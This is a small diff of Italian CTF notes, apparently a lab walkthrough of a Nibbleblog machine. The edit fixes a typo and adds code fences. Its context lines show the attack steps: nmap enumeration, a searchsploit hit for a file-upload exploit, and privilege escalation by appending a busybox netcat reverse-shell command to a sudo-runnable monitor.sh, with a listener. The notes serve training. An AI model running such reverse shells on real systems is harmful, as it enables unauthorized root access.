@@ -5,7 +5,7 @@
 nmap -sCV -O iptarget
 ```
 vedere codice sorgente
-direcotry nibbleblog
+directory nibbleblog
 ```bash
 searchsploit nibbleblog         
 nibbleblog 4.0.3 - Arbitrary File Upload (Met | php/remote/38489.rb
@@ -36,7 +36,9 @@ cat user.txt
 sudo -l
 monitor.sh programma che ci permette di eseguire il privilege escalation
 ```
+```bash
 echo "busybox nc 10.10.14.130 8000 -e /bin/sh" >> monitor.sh
+```
 Apriamo un nuovo terminale
 ```bash
 nc -lnvp 8000
